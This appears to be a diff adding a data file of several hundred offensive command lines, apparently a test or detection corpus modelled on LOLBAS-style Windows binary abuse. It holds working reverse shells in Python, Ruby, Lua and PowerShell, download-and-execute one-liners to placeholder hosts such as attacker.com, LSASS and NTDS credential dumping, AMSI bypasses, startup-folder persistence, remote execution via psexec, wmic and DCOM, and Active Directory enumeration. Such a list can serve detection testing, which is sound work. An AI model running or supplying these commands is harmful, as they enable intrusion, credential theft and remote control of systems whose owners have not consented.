@@ -1,0 +1,490 @@
+start ms-appinstaller://?source=https://pastebin.com/raw/tdyShwLw
+start ms-appinstaller://?source=https://10.101.10.10/raw/tdyShwLw
+start ms-appinstaller://?source=https://11.101.10.10/raw/tdyShwLw
+C:\\Windows\\System32\\at.exe at 09:00 /interactive /every:m,t,w,th,f,s,su C:\\Windows\\System32\\revshell.exe
+ATBroker.exe /start malware
+bash.exe -c calc.exe
+bash.exe -c calc.exe
+bitsadmin /create 1 bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\1.txt:cmd.exe NULL bitsadmin /RESUME 1 bitsadmin /complete 1
+bitsadmin /create 1 bitsadmin /addfile 1 https://live.sysinternals.com/autoruns.exe c:\\data\\playfolder\\autoruns.exe bitsadmin /RESUME 1 bitsadmin /complete 1
+bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /RESUME 1 & bitsadmin /Complete 1 & bitsadmin /reset
+bitsadmin /create 1 & bitsadmin /addfile 1 c:\\windows\\system32\\cmd.exe c:\\data\\playfolder\\cmd.exe & bitsadmin /SetNotifyCmdLine 1 c:\\data\\playfolder\\cmd.exe NULL & bitsadmin /RESUME 1 & bitsadmin /Reset
+CertReq -Post -config https://example.org/ c:\\windows\\win.ini output.txt
+CertReq -Post -config https://example.org/ c:\\windows\\win.ini and show response in terminal
+certutil.exe -urlcache -split -f http://7-zip.org/a/7z1604-x64.exe 7zip.exe
+certutil.exe -urlcache -split -f https://raw.githubusercontent.com/Moriarty2016/git/master/test.ps1 c:\\temp:ttt
+certutil -encode inputFileName encodedOutputFileName
+certutil -decode encodedInputFileName decodedOutputFileName
+cmd.exe /c echo regsvr32.exe ^/s ^/u ^/i:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1117/RegSvr32.sct ^scrobj.dll > fakefile.doc:payload.bat
+cmdkey /list
+cmstp.exe /ni /s c:\\cmstp\\CorpVPN.inf
+cmstp.exe /ni /s https://raw.githubusercontent.com/api0cradle/LOLBAS/master/OSBinaries/Payload/Cmstp.inf
+ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://10.10.10.10/xxxxxxxxx?encodedfile
+ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://11.11.11.11/xxxxxxxxx?encodedfile
+ConfigSecurityPolicy.exe C:\\\\Windows\\\\System32\\\\calc.exe https://webhook.site/xxxxxxxxx?encodedfile
+control.exe c:\\windows\\tasks\\file.txt:evil.dll
+csc.exe -out:My.exe File.cs
+cscript c:\\ads\\file.txt:script.vbs
+DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://webhook.site/xxxxxxxxx?encodedfile
+DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://11.11.11.11/xxxxxxxxx?encodedfile
+DataSvcUtil /out:C:\\\\Windows\\\\System32\\\\calc.exe /uri:https://10.10.10.10/xxxxxxxxx?encodedfile
+set "SYSTEMROOT=C:\\Windows\\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr
+rundll32.exe dfshim.dll,ShOpenVerbApplication http://www.domain.com/application/?param1=foo
+diantz.exe c:\\pathToFile\\file.exe c:\\destinationFolder\\targetFile.txt:targetFile.cab
+diantz.exe \\\\remotemachine\\pathToFile\\file.exe c:\\destinationFolder\\file.cab
+diantz.exe \\\\11.121.12.13\\pathToFile\\file.exe c:\\destinationFolder\\file.cab
+diantz.exe \\\\10.10.10.10\\pathToFile\\file.exe c:\\destinationFolder\\file.cab
+diskshadow.exe /s c:\\test\\diskshadow.txt
+diskshadow> exec calc.exe
+dllhost.exe /Processid:{CLSID}
+dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\192.168.0.149\\dll\\wtf.dll
+dnscmd.exe dc1.lab.int /config /serverlevelplugindll \\\\193.168.0.149\\dll\\wtf.dll
+dnscmd.exe 10.10.10.10 /config /serverlevelplugindll \\\\193.168.0.149\\dll\\wtf.dll
+esentutl.exe /y C:\\folder\\sourcefile.vbs /d C:\\folder\\destfile.vbs /o
+esentutl.exe /y C:\\ADS\\file.exe /d c:\\ADS\\file.txt:file.exe /o
+esentutl.exe /y \\\\live.sysinternals.com\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o
+esentutl.exe /y \\\\11.11.11.11\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o
+esentutl.exe /y \\\\10.10.10.10\\tools\\adrestore.exe /d \\\\otherwebdavserver\\webdav\\adrestore.exe /o
+eventvwr.exe
+expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.bat
+expand c:\\ADS\\file1.bat c:\\ADS\\file2.bat
+expand \\\\webdav\\folder\\file.bat c:\\ADS\\file.txt:file.bat
+expand \\\\11.12.13.14\\folder\\file.bat c:\\ADS\\file.txt:file.bat
+expand \\\\10.10.10.10\\folder\\file.bat c:\\ADS\\file.txt:file.bat
+explorer.exe /root,"C:\\Windows\\System32\\calc.exe"
+Extexport.exe c:\\test foo bar
+extrac32 C:\\ADS\\procexp.cab c:\\ADS\\file.txt:procexp.exe
+extrac32 /Y /C \\\\webdavserver\\share\\test.txt C:\\folder\\test.txt
+extrac32.exe /C C:\\Windows\\System32\\calc.exe C:\\Users\\user\\Desktop\\calc.exe
+findstr /V /L W3AllLov3DonaldTrump c:\\ADS\\file.exe > c:\\ADS\\file.txt:file.exe
+findstr /S /I cpassword \\\\sysvol\\policies\\*.xml
+findstr /V /L W3AllLov3DonaldTrump \\\\webdavserver\\folder\\file.exe > c:\\ADS\\file.exe
+forfiles /p c:\\windows\\system32 /m notepad.exe /c calc.exe
+forfiles /p c:\\windows\\system32 /m notepad.exe /c "c:\\folder\\normal.dll:evil.exe"
+echo !calc.exe > ftpcommands.txt && ftp -s:ftpcommands.txt
+cmd.exe /c "@echo open attacker.com 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
+cmd.exe /c "@echo open 11.11.11.11 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
+cmd.exe /c "@echo open 10.10.10.10 21>ftp.txt&@echo USER attacker>>ftp.txt&@echo PASS PaSsWoRd>>ftp.txt&@echo binary>>ftp.txt&@echo GET /payload.exe>>ftp.txt&@echo quit>>ftp.txt&@ftp -s:ftp.txt -v"
+C:\\Windows\\System32\\DriverStore\\FileRepository\\igdlh64.inf_amd64_[0-9]+\\GfxDownloadWrapper.exe "URL" "DESTINATION FILE"
+Gpscript /logon
+HH.exe http://some.url/script.ps1
+HH.exe c:\\windows\\system32\\calc.exe
+ie4uinit.exe -BaseSettings
+ieexec.exe http://x.x.x.x:8080/bypass.exe
+ieexec.exe http://10.10.10.10:8080/bypass.exe
+ieexec.exe http://11.11.11.11:8080/bypass.exe
+ilasm.exe C:\\public\\test.txt /exe
+InfDefaultInstall.exe Infdefaultinstall.inf
+InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+InstallUtil.exe /logfile= /LogToConsole=false /U AllTheThings.dll
+jsc.exe scriptfile.js
+makecab c:\\ADS\\autoruns.exe c:\\ADS\\cabtest.txt:autoruns.cab
+makecab \\\\webdavserver\\webdav\\file.exe C:\\Folder\\file.cab
+makecab \\\\10.10.10.10\\webdav\\file.exe C:\\Folder\\file.cab
+MavInject.exe 3110 /INJECTRUNNING c:\\folder\\evil.dll
+Mavinject.exe 4172 /INJECTRUNNING "c:\\ads\\file.txt:file.dll"
+Microsoft.Workflow.Compiler.exe tests.xml results.xml
+Microsoft.Workflow.Compiler.exe tests.txt results.txt
+mmc.exe -Embedding c:\\path\\to\\test.msc
+MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\beacon.exe
+MpCmdRun.exe -DownloadFile -url https://attacker.server/beacon.exe -path c:\\\\temp\\\\nicefile.txt:evil.exe
+msbuild.exe pshell.xml
+msbuild.exe project.csproj
+Msconfig.exe -5
+msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE
+msdt.exe -path C:\\WINDOWS\\diagnostics\\index\\PCWDiagnostic.xml -af C:\\PCW8E57.xml /skip TRUE
+mshta.exe evilfile.hta
+mshta.exe "C:\\ads\\file.txt:file.hta"
+msiexec /quiet /i cmd.msi
+netsh.exe add helper C:\\Users\\User\\file.dll
+odbcconf -f file.rsp
+pcalua.exe -a calc.exe
+Pcwrun.exe c:\\temp\\beacon.exe
+pktmon.exe start --etw
+pnputil.exe -i -a C:\\Users\\hai\\Desktop\\mo.inf
+Presentationhost.exe C:\\temp\\Evil.xbap
+print /D:C:\\ADS\\File.txt:file.exe C:\\ADS\\File.exe
+print /D:C:\\ADS\\CopyOfFile.exe C:\\ADS\\FileToCopy.exe
+psr.exe /start /output D:\\test.zip /sc 1 /gui 0
+rasautou -d powershell.dll -p powershell -a a -e e
+reg export HKLM\\SOFTWARE\\Microsoft\\Evilreg c:\\ads\\file.txt:evilreg.reg
+regasm.exe AllTheThingsx64.dll
+regasm.exe /U AllTheThingsx64.dll
+regedit /E c:\\ads\\file.txt:regfile.reg HKEY_CURRENT_USER\\MyCustomRegKey
+regini.exe newfile.txt:hidden.ini
+Register-cimprovider -path "C:\\folder\\evil.dll"
+regsvcs.exe AllTheThingsx64.dll
+regsvcs.exe AllTheThingsx64.dll
+regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+regsvr32 /s /n /u /i:http://example.com/file.sct scrobj.dll
+replace.exe C:\\Source\\File.cab C:\\Destination /A
+replace.exe \\\\webdav.host.com\\foo\\bar.exe c:\\outdir /A
+rpcping -s 127.0.0.1 -e 1234 -a privacy -u NTLM
+rundll32.exe AllTheThingsx64,EntryPoint
+rundll32 "C:\\ads\\file.txt:ADSDLL.dll",DllMain
+Runonce.exe /AlternateShellStartup
+runscripthelper.exe surfacecheck \\\\?\\C:\\Test\\Microsoft\\Diagnosis\\scripts\\test.txt C:\\Test
+sc create evilservice binPath="\\"c:\\\\ADS\\\\file.txt:cmd.exe\\" /c echo works > \\"c:\\ADS\\works.txt\\"" DisplayName= "evilservice" start= auto\\ & sc start evilservice
+schtasks /create /sc minute /mo 1 /tn "Reverse shell" /tr c:\\some\\directory\\revshell.exe
+Scriptrunner.exe -appvscript calc.exe
+SyncAppvPublishingServer.exe "n;(New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX"
+TTDInject.exe /ClientParams "7 tmp.run 0 0 0 0 0 0 0 0 0 0" /Launch "C:/Windows/System32/calc.exe"
+tttracer.exe C:\\windows\\system32\\calc.exe
+TTTracer.exe -dumpFull -attach pid
+vbc.exe /target:exe c:\\temp\\vbs\\run.vb
+verclsid.exe /S /C {CLSID}
+wab.exe
+wmic.exe process call create "c:\\ads\\file.txt:program.exe"
+wmic.exe process call create calc
+wscript c:\\ads\\file.txt:script.vbs
+wsreset.exe
+wuauclt.exe /UpdateDeploymentProvider <Full_Path_To_DLL> /RunHandlerComServer
+xwizard RunWizard {00000001-0000-0000-0000-0000FEEDACDC}
+xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://pastebin.com/raw/iLxUT5gM
+xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://10.10.10.10/raw/iLxUT5gM
+xwizard RunWizard {7940acf8-60ba-4213-a7c3-f3b400ee266d} /zhttps://11.11.11.11/raw/iLxUT5gM
+rundll32.exe advpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,
+rundll32.exe advpack.dll,RegisterOCX test.dll
+rundll32 C:\\windows\\system32\\comsvcs.dll MiniDump "[LSASS_PID] dump.bin full"
+rundll32.exe ieadvpack.dll,LaunchINFSection c:\\test.inf,DefaultInstall_SingleUser,1,
+rundll32.exe ieadvpack.dll,RegisterOCX test.dll
+rundll32.exe ieframe.dll,OpenURL "C:\\test\\calc.url"
+rundll32.exe Mshtml.dll,PrintHTML "C:\\temp\\calc.hta"
+rundll32.exe pcwutl.dll,LaunchApplication calc.exe
+rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\Tools\\shady.inf
+rundll32.exe setupapi.dll,InstallHinfSection DefaultInstall 128 C:\\\\Tools\\\\calc_exe.inf
+rundll32.exe shdocvw.dll,OpenURL "C:\\test\\calc.url"
+rundll32.exe shell32.dll,Control_RunDLL payload.dll
+rundll32.exe syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\\test\\shady.inf
+rundll32 syssetup.dll,SetupInfObjectInstallAction DefaultInstall 128 c:\\temp\\something.inf
+rundll32.exe url.dll,OpenURL "C:\\test\\calc.hta"
+rundll32.exe zipfldr.dll,RouteTheCall calc.exe
+adplus.exe -hang -pn lsass.exe -o c:\\users\\mr.d0x\\output\\folder -quiet
+AgentExecutor.exe -powershell "c:\\temp\\malicious.ps1" "c:\\temp\\test.log" "c:\\temp\\test1.log" "c:\\temp\\test2.log" 60000 "C:\\Windows\\SysWOW64\\WindowsPowerShell\\v1.0" 0 1
+AppVLP.exe \\\\webdav\\calc.bat
+AppVLP.exe \\\\10.10.10.10\\calc.bat
+bginfo.exe bginfo.bgi /popup /nolicprompt
+bginfo.exe bginfo.bgi /popup /nolicprompt
+cdb.exe -cf x64_calc.wds -o notepad.exe
+coregon.exe.exe /L C:\\folder\\evil.dll dummy_assembly_name
+coregen.exe /L C:\\folder\\evil.dll dummy_assembly_name
+csi.exe file
+DefaultPack.EXE /C:"process.exe args"
+devtoolslauncher.exe LaunchForDeploy [PATH_TO_BIN] "argument here" test
+dnx.exe consoleapp
+dotnet.exe [PATH_TO_DLL]
+dotnet.exe [PATH_TO_DLL]
+Dxcap.exe -c C:\\Windows\\System32\\notepad.exe
+Excel.exe http://192.168.1.10/TeamsAddinLoader.dll
+Mftrace.exe cmd.exe
+msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="c:\\temp\\calc.bat"
+msdeploy.exe -verb:sync -source:RunCommand -dest:runCommand="c:\\temp\\calc.bat"
+msxsl.exe customers.xml script.xsl
+msxsl.exe customers.xml script.xsl
+ntdsutil.exe "ac i ntds" "ifm" "create full c:\\" q q
+Powerpnt.exe "http://192.168.1.10/TeamsAddinLoader.dll"
+Powerpnt.exe "http://193.168.1.10/TeamsAddinLoader.dll"
+Powerpnt.exe "http://amaare.mere/TeamsAddinLoader.dll"
+rcsi.exe bypass.csx
+rcsi.exe bypass.csx
+Remote.exe /s "powershell.exe" anythinghere
+Remote.exe /s "powershell.exe" anythinghere
+sqldumper.exe 464 0 0x0110
+Sqlps.exe -noprofile
+SQLToolsPS.exe -noprofile -command Start-Process calc.exe
+squirrel.exe --download [http://10.10.10.1]
+squirrel.exe --download [http://11.1.1.1]
+squirrel.exe --download [http://nice.domain]
+squirrel.exe --update [http://10.10.10.1]
+squirrel.exe --update [http://11.1.1.1]
+squirrel.exe --update [http://nice.domain]
+te.exe bypass.wsc
+Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe
+Tracker.exe /d .\\calc.dll /c C:\\Windows\\write.exe
+Update.exe --download [http:/nice.domain]
+Update.exe --download [http://11.10.10.1]
+Update.exe --download [http://10.10.10.1]
+Update.exe --update=[http://10.10.10.1]
+Update.exe --update=[http://11.10.10.1]
+Update.exe --update=[http:/nice.domain]
+Vsjitdebugger.exe calc.exe
+winword.exe "http://192.168.1.10/TeamsAddinLoader.dll"
+wsl.exe -e /mnt/c/Windows/System32/calc.exe
+wsl.exe --exec bash -c \'cat < /dev/tcp/192.168.1.10/54 > binary\'
+. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Mutexverifiers.ps1   \\nrunAfterCancelProcess calc.ps1
+. C:\\\\Windows\\\\diagnostics\\\\system\\\\AERO\\\\CL_Invocation.ps1   \\nSyncInvoke <executable> [args]
+set comspec=c:\\windows\\system32\\calc.exe & cscript c:\\windows\\system32\\manage-bde.wsf
+pubprn.vbs 127.0.0.1 script:https://domain.com/folder/file.sct
+pubprn.vbs 127.0.0.1 script:https://10.10.10.10/folder/file.sct
+pubprn.vbs 127.0.0.1 script:https://11.10.10.10/folder/file.sct
+reg.exe import c:\\path\\to\\Slmgr.reg & cscript.exe /b c:\\windows\\system32\\slmgr.vbs
+SyncAppvPublishingServer.vbs "n;((New-Object Net.WebClient).DownloadString(\'http://some.url/script.ps1\') | IEX"
+winrm invoke Create wmicimv2/Win32_Process @{CommandLine="notepad.exe"} -r:http://target:5985
+%SystemDrive%\\BypassDir\\cscript //nologo %windir%\\System32\\winrm.vbs get wmicimv2/Win32_Process?Handle=4 -format:pretty
+Pester.bat [/help|?|-?|/?] "$null; notepad"
+C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('11.0.0.1', 4242)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
+ruby -rsocket -e 'c=TCPSocket.new("10.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+ruby -rsocket -e 'c=TCPSocket.new("11.0.0.1","4242");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
+lua5.1 -e 'local host, port = "10.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+lua5.1 -e 'local host, port = "11.0.0.1", 4242 local socket = require("socket") local tcp = socket.tcp() local io = require("io") tcp:connect(host, port); while true do local cmd, status, partial = tcp:receive() local f = io.popen(cmd, "r") local s = f:read("*a") f:close() tcp:send(s) if status == "closed" then break end end tcp:close()'
+powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 10.0.0.2 3001
+powershell IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 11.0.0.2 3001
+psexec \\test.domain -u Domain\User -p Password ipconfig
+psexec \\10.10.10.10 -u Domain\User -p Password ipconfig
+sc \\host.domain create ExampleService binpath= “c:\windows\system32\calc.exe”
+sc \\10.10.10.10 create ExampleService binpath= “c:\windows\system32\calc.exe”
+sc \\10.10.10.10 start ExampleService
+sc \\host.domain start ExampleService
+wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe”
+wmic /node:10.10.10.10 /user:domain\user /password:password process call create "C:\Windows\System32\calc.exe”
+winrs -r:EXAMPLE.lab.local -u:DOMAIN\user -p:password calc.exe
+winrs -r:10.10.10.10 -u:DOMAIN\user -p:password calc.exe
+schtasks /create /tn ExampleTask /tr c:\windows\system32\calc.exe /sc once /st 00:00 /S host.domain /RU System
+schtasks /run /tn ExampleTask /S host.domain
+schtasks /run /tn ExampleTask /S 10.10.10.10
+schtasks /F /delete /tn ExampleTask /S host.domain
+schtasks /F /delete /tn ExampleTask /S 10.10.10.10
+MSBuild.exe \\host.domain\path\to\XMLfile.xml
+MSBuild.exe \\10.10.10.10\path\to\XMLfile.xml
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\host.domain\path\to\XMLfile.xml
+C:\Windows\Microsoft.NET\Framework64\v4.0.30319\MSBuild.exe \\10.10.10.10\path\to\XMLfile.xml
+wmic /node:LABWIN10.lab.local /user:LAB\Administrator /password:Password! process call create "c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\LAB2012DC01.LAB.local\C$\Windows\Temp\build.xml"
+wmic /node:10.10.10.10 /user:LAB\Administrator /password:Password! process call create "c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\10.10.10.10\C$\Windows\Temp\build.xml"
+copy C:\Users\Administrator\Downloads\build.xml \\10.10.10.10\C$\Windows\Temp\
+wmic /node:LABWIN10.lab.local /user:LAB\Administrator /password:Password! process call create "c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe C:\Windows\Temp\build.xml"
+wmic /node:10.10.10.10 /user:LAB\Administrator /password:Password! process call create "c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe C:\Windows\Temp\build.xml"
+psexec \\host.domain -u Domain\Tester -p Passw0rd c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\host.domain\C$\Windows\Temp\build.xml"
+psexec \\10.10.10.10 -u Domain\Tester -p Passw0rd c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe \\10.10.10.10\C$\Windows\Temp\build.xml"
+powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.10.30")).Document.ActiveView.ExecuteShellCommand("C:\Windows\System32\Calc.exe","0","0","0")
+powershell [System.Activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.Application","192.168.10.30")).Document.ActiveView.ExecuteShellCommand("c:\windows\Microsoft.NET\Framework\v4.0.30319\Msbuild.exe",$null,"\\192.168.10.131\webdav\build.xml","7")
+copy C:\Windows\Temp\Malice.exe \\10.10.10.10\C$\Windows\Temp
+wmic /node:target.domain /user:domain\user /password:password process call create "C:\Windows\Temp\Malice.exe”
+wmic /node:10.10.10.10 /user:domain\user /password:password process call create "C:\Windows\Temp\Malice.exe”
+mshta.exe http://malicious.domain/runme.hta
+mshta.exe http://11.10.10.10/runme.hta
+mshta.exe http://10.10.10.10/runme.hta
+rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//www[.]example[.]com/malicious.sct")"
+rundll32.exe javascript:"..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https[:]//11.12.12.11/malicious.sct")"
+rundll32.exe url.dll,OpenURL "C:\Windows\Temp\test.hta"
+regsvr32 /s /n /u /i:http://server/file.sct scrobj.dll
+regsvr32 /s /n /u /i:http://11.12.13.14/file.sct scrobj.dll
+regsvr32 /s /n /u /i:http://10.12.13.14/file.sct scrobj.dll
+powershell [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+powershell [Delegate]::CreateDelegate(("Func``3[String, $(([String].Assembly.GetType('System.Reflection.Bindin'+'gFlags')).FullName), System.Reflection.FieldInfo]" -as [String].Assembly.GetType('System.T'+'ype')), [Object]([Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')),('GetFie'+'ld')).Invoke('amsiInitFailed',(('Non'+'Public,Static') -as [String].Assembly.GetType('System.Reflection.Bindin'+'gFlags'))).SetValue($null,$True)
+powershell IEX (New-Object Net.WebClient).DownloadString('http://10.10.16.7/PowerView.obs.ps1')
+powershell IEX (New-Object Net.WebClient).DownloadString('http://11.10.16.7/PowerView.obs.ps1')
+powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://10.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
+powershell $h=new-object -com WinHttp.WinHttpRequest.5.1;$h.open('GET','http://11.10.16.7/PowerView.obs.ps1',$false);$h.send();iex $h.responseText
+powershell (New-Object System.Net.WebClient).DownloadFile("http://192.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
+powershell (New-Object System.Net.WebClient).DownloadFile("http://193.168.119.155/PowerUp.ps1", "C:\Windows\Temp\PowerUp.ps1")
+powershell Invoke-WebRequest "http://10.10.16.7/Rev.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe"
+powershell Invoke-WebRequest "http://11.10.16.7/Rev.exe" -OutFile "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp\Rev.exe"
+powershell $bytes = [System.Text.Encoding]::Unicode.GetBytes($command)
+powershell $encodedCommand = [Convert]::ToBase64String($bytes)
+powershell Get-DomainUser | select -ExpandProperty cn
+powershell Get-DomainUser | select -ExpandProperty cn
+powershell Get-DomainComputer
+powershell Get-ForestDomain
+powershell Get-DomainTrust
+powershell Get-ForestTrust
+powershell Get-DomainGroup "Domain Admins"
+powershell Get-DomainGroupMember "Domain Admins" | select -ExpandProperty membername
+powershell Find-DomainShare -ExcludeStandard -ExcludePrint -ExcludeIPC
+powershell Get-DomainOU -FullData
+powershell Get-DomainOU -name Servers | %{ Get-DomainComputer -SearchBase $_.distinguishedname } | select dnshostname
+powershell Get-DomainOU *WS* | select gplink
+powershell Get-DomainGPO -Name "{3E04167E-C2B6-4A9A-8FB7-C811158DC97C}"
+powershell Get-DomainGPOLocalGroup -ResolveMembersToSIDs | select GPODisplayName, GroupName, GroupMemberOf, GroupMembers
+powershell Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=targetdomain,DC=com" -ResolveGUIDs | ?{ $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier
